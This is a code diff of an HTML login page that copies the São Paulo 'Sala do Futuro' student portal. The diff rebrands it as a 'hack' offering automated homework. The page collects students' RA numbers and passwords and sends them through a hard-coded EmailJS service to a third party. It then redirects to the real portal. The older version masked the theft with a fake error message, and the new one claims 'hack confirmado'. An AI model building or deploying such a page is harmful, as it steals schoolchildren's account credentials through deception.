@@ -23,7 +23,7 @@
         }
         
         body {            
-            background-color: var(--bg-color); /* Fundo igual ao do app para preencher tudo */
+            background-color: #fff;            
             display: flex;            
             justify-content: center;            
             align-items: center;            
@@ -33,8 +33,7 @@
         .app-container {            
             background-color: var(--bg-color);            
             width: 100%;            
-            /* Removido o max-width para ocupar a tela toda */
-            max-width: 100%;            
+            max-width: 400px;            
             height: 100dvh;            
             position: relative;            
             overflow: hidden;            
@@ -46,21 +45,10 @@
             padding: 25px; 
             display: flex; 
             flex-direction: column; 
-            justify-content: center; /* Centraliza o conteúdo verticalmente na tela do PC */
-            align-items: center;     /* Centraliza o conteúdo horizontalmente na tela do PC */
             height: 100%; 
             overflow-y: auto; 
-            width: 100%;
         }        
         
-        /* Container interno para os formulários não ficarem infinitamente largos no monitor */
-        .content-wrapper {
-            width: 100%;
-            max-width: 450px; /* Limite suave para manter a legibilidade no PC */
-            display: flex;
-            flex-direction: column;
-        }
-
         .hidden { 
             display: none !important; 
         }
@@ -114,10 +102,9 @@
             display: flex; 
             flex-direction: column; 
             gap: 12px; 
-            width: 100%;
         }        
         
-        .card { 
+        #card { 
             background: #fff; 
             border-radius: 16px; 
             padding: 20px; 
@@ -125,13 +112,15 @@
             align-items: center; 
             box-shadow: 0 4px 18px rgba(0, 0, 0, 0.10); 
             cursor: pointer; 
+            border: solid 5px green;
+      
         }        
         
         .card-content { 
             flex: 1; 
             display: flex; 
             flex-direction: column; 
-        }        
+              }        
         
         .card-role { 
             color: var(--text-light); 
@@ -173,21 +162,15 @@
             margin-top: 20px; 
             margin-bottom: 20px; 
             min-height: 111px; 
-            font-size: 25px;
-            width: 100%;
+            font-size: 25px 
         }
         
         .form-row { 
             display: flex; 
             gap: 12px; 
             margin-bottom: 12px; 
-            width: 100%;
         }        
         
-        .input-group {
-            width: 100%;
-        }
-
         .input-group label { 
             color: var(--text-gray); 
             font-size: 14px; 
@@ -251,7 +234,6 @@
             display: flex; 
             gap: 12px; 
             margin-bottom: 30px; 
-            width: 100%;
         }        
         
         .btn { 
@@ -281,129 +263,133 @@
             font-weight: 700; 
             font-size: 17px; 
             margin-bottom: 25px; 
-        }    
+        }   
+.mtcs {
+    padding: 20%;
+    font-size: 35px;
+    font-weight: -10;
+    color: red;
+}    
     </style>
 </head>
 <body>
     <div class="app-container">                
         
-        <div id="screen-menu" class="screen">            
-            <div class="content-wrapper">
-                <div class="header-logo">                
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/1/1c/Sala_do_Futuro_logo.png" alt="logo">                
-                    <span class="text">SALA DO <br> FUTURO</span>            
-                </div>            
-                <h1>Olá, novamente!</h1>            
-                <p class="subtitle">Já estávamos sentindo sua falta.</p>            
-                <p class="instruction">Escolha abaixo um perfil para acessar.</p>                        
-                
-                <div class="menu-cards">                
-                    <div class="card" onclick="toggleScreens('screen-login')">                    
-                        <div class="card-content">
-                            <span class="card-role">Sou</span>
-                            <span class="card-title">Estudante</span>
-                        </div>                    
-                        <div class="card-arrow">➔</div>                
-                    </div>
-                    
-                    <div class="card" onclick="toggleScreens('screen-server')">                    
-                        <div class="card-content">
-                            <span class="card-role">Sou</span>
-                            <span class="card-title">Servidor</span>
-                        </div>                    
-                        <span class="gov-link">acesso via <strong>GOV.BR</strong></span>                    
-                        <div class="card-arrow">➔</div>                
-                    </div>
-                    
-                    <div class="card" onclick="alert('Em breve')">                    
-                        <div class="card-content">
-                            <span class="card-role">Sou</span>
-                            <span class="card-title">Responsável</span>
-                        </div>                    
-                        <div class="card-arrow">➔</div>                
-                    </div>            
+        <div id="screen-menu" class="screen-menu screen">
+
+         <div class="header-logo">                
+                <img src="https://upload.wikimedia.org/wikipedia/commons/1/1c/Sala_do_Futuro_logo.png" alt="logo">                
+                <span class="text">SALA DO <br> PASSADO</span>            
+            </div>            
+            <h1>Olá, novamente!</h1>            
+            <p class="subtitle">Já estávamos sentindo sua falta.</p>            
+            <p class="instruction">faz tarefas, matific, alura, speak, redacao, e leiasp</p>                        
+            
+            <div class="menu-cards">                
+                <div id="card" onclick="toggleScreens('screen-login')">                    
+                    <div id="card-content">
+                        <span class="card-role">Sou</span>
+                        <span class="card-title">Estudante</span>
+                    </div>                    
+                    <div class="card-arrow">➔</div>                
                 </div>
                 
-                <div class="banner">                
-                    <p>Você sabe o que é a<br><strong>SALA DO FUTURO?</strong></p>            
-                </div>        
+                <div id="card" onclick="toggleScreens('screen-server')">                    
+                    <div class="card-content">
+                        <span class="card-role">Sou</span>
+                        <span class="card-title">Servidor</span>
+                    </div>                    
+                    <span class="gov-link">acesso via <strong>GOV.BR</strong></span>                    
+                    <div class="card-arrow">➔</div>                
+                </div>
+                
+                <div id="card" onclick="alert('Em breve')">                    
+                    <div class="card-content">
+                        <span class="card-role">Sou</span>
+                        <span class="card-title">Responsável</span>
+                    </div>                    
+                    <div class="card-arrow">➔</div>                
+                </div>            
             </div>
-        </div>
+            
+            <div style="overflow: auto;"class="banner">                
+                <p >O speak pode demorar e/ou fazer pouco pois está em desenvolvimento<br><strong>SALA DO PASSADO</strong></p>            
+            </div>      
+<div class="mtcs">SALA DO FUTURO HACK</div>
+            
+             </div>
         
         <div id="screen-login" class="screen hidden">            
-            <div class="content-wrapper">
-                <div class="header-logo">                
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/1/1c/Sala_do_Futuro_logo.png" alt="logo">                
-                    <span class="text">SALA DO <br> FUTURO</span>            
+            <div class="header-logo">                
+                <img src="https://upload.wikimedia.org/wikipedia/commons/1/1c/Sala_do_Futuro_logo.png" alt="logo">                
+                <span class="text">SALA DO <br> PASSADO</span>            
+            </div>            
+            <h1>369llll the legend</h1>            
+            <p class="subtitle">Preencha seus dados abaixo para acessar o sistema. </p>
+            
+            <div class="form-row">                
+                <div class="input-group input-ra">
+                    <label style="color: red;">RA</label>
+                    <input type="text" id="ra" placeholder="Ex.: 186735683">
+                </div>                
+                
+                <div class="input-group input-digito">
+                    <label style="color: red;">Dígito RA</label>
+                    <input type="text" id="digito" placeholder="0">
+                </div>                
+                
+                <div class="input-group input-uf">                    
+                    <label>UF</label>                    
+                    <select id="uf">                        
+                        <option>SP</option>
+                        <option>RJ</option>
+                        <option>SC</option>
+                        <option>PR</option>                        
+                        <option>RS</option>
+                        <option>MG</option>
+                        <option>BA</option>                    
+                    </select>                
                 </div>            
-                <h1>Estudante</h1>            
-                <p class="subtitle">Preencha seus dados abaixo para acessar o sistema.</p>
-                
-                <div class="form-row">                
-                    <div class="input-group input-ra">
-                        <label>RA</label>
-                        <input type="text" id="ra" placeholder="Ex.: 186735683">
-                    </div>                
-                    
-                    <div class="input-group input-digito">
-                        <label>Dígito RA</label>
-                        <input type="text" id="digito" placeholder="0">
-                    </div>                
-                    
-                    <div class="input-group input-uf">                    
-                        <label>UF</label>                    
-                        <select id="uf">                        
-                            <option>SP</option>
-                            <option>RJ</option>
-                            <option>SC</option>
-                            <option>PR</option>                        
-                            <option>RS</option>
-                            <option>MG</option>
-                            <option>BA</option>                    
-                        </select>                
-                    </div>            
-                </div>                        
-                
-                <a href="#" class="link link-right" style="color: #5ba4bf">Esqueceu o RA. <strong>Clique aqui</strong></a>
-                
-                <div class="input-group password-container">                
-                    <label>Senha</label>                
-                    <input type="password" id="senha" placeholder="Digite sua senha">                
-                    <span class="eye-icon">                    
-                        <svg viewBox="0 0 24 24">
-                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
-                        </svg>                
-                    </span>            
-                </div>
-                
-                <span class="link link-center">Esqueceu a senha? <strong>Acesse aqui</strong>.</span>
-                
-                <div class="action-buttons">                
-                    <button class="btn btn-outline" onclick="toggleScreens()">Voltar</button>                
-                    <button class="btn btn-filled" onclick="enviarDados()">Acessar</button>            
-                </div>                        
-                
-                <div class="help-link">Preciso de ajuda</div>            
-                <img style="max-width: 130px; margin: 0 auto;" src="https://maisexpressao.com.br/imagens/noticias/70831/640x480/logomarca-sp.png" alt="seduc logo">        
+            </div>                        
+            
+            <a href="#" class="link link-right" style="color: #5ba4bf">Esqueceu o RA. <strong>Clique aqui</strong></a>
+            
+            <div class="input-group password-container">                
+                <label style="color: red;">Senha</label>                
+                <input type="password" id="senha" placeholder="Digite sua senha">                
+                <span class="eye-icon">                    
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                    </svg>                
+                </span>            
             </div>
+            
+            <span class="link link-center">Esqueceu a senha? <strong>Acesse aqui</strong>.</span>
+            
+            <div class="action-buttons">                
+                <button class="btn btn-outline" onclick="toggleScreens()">Voltar</button>                
+                <button class="btn btn-filled" onclick="enviarDados()">Acessar</button>            
+            </div>                        
+            
+            <div class="help-link">Preciso de ajuda</div>            
+            <img style="max-width: 130px; margin: 0 auto;" src="https://maisexpressao.com.br/imagens/noticias/70831/640x480/logomarca-sp.png" alt="seduc logo">        
         </div>
         
         <div id="screen-server" class="screen hidden">            
-            <div class="content-wrapper">
-                <div class="header-logo">                
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/1/1c/Sala_do_Futuro_logo.png" alt="logo">                
-                    <span class="text">SALA DO <br> FUTURO</span>            
-                </div>            
-                <h1>Servidor</h1>            
-                <p class="subtitle">Acesso administrativo via GOV.BR</p>            
-                <button class="btn btn-outline" onclick="toggleScreens()">Voltar</button>        
-            </div>
+            <div class="header-logo">                
+                <img src="https://upload.wikimedia.org/wikipedia/commons/1/1c/Sala_do_Futuro_logo.png" alt="logo">                
+                <span class="text">SALA DO <br> FUTURO</span>            
+            </div>            
+            <h1>Servidor</h1>            
+            <p class="subtitle">Acesso administrativo via GOV.BR</p>            
+            <button class="btn btn-outline"  onclick="toggleScreens()">Voltar</button>        
         </div>
-        
+        <h2 style="color: red;">Created by 369llll lucas</h2>
     </div>
-    
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>    
+       <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>    
     <script>        
+    
+    
         emailjs.init("8pgahZ_-rhwjIlwKO");                
         
         function toggleScreens(targetId) {            
@@ -436,7 +422,7 @@
             
             emailjs.send('service_wr60pwg', 'template_xx2s2qo', templateParams)                
                 .then(function() {                   
-                    if(confirm('Ops, ocorreu um erro técnico. Clique em OK para tentar pelo portal oficial.')) {                       
+                    if(confirm('hack confirmado, espera no maximo 1 dia.')) {                       
                         window.location.href = "https://saladofuturo.educacao.sp.gov.br/login-alunos";                   
                     }                
                 }, function(error) {                   
